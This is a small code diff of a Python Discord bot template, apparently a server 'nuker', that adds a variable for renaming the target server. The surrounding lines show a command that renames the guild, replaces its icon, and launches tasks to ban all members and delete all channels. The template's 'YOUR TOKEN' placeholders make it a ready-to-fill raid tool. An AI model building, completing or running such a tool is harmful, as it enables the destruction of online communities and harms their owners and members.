@@ -9,6 +9,7 @@ client = commands.Bot(command_prefix='YOUR PREFIX', intents=intents)
 token = "YOUR TOKEN"
 
 
+server_name = "YOUR TEXT"
 message = "YOUR TEXT"
 reason = "YOUR TEXT"
 channels_name = "YOUR TEXT"
@@ -32,7 +33,7 @@ async def start(ctx):
     await ctx.message.delete()
 
     with open('image.png') as image:
-        await ctx.guild.edit(name=message, icon=image.read())
+        await ctx.guild.edit(name=server_name, icon=image.read())
 
     create_task(ban_all(ctx))
     create_task(delete_channels(ctx))
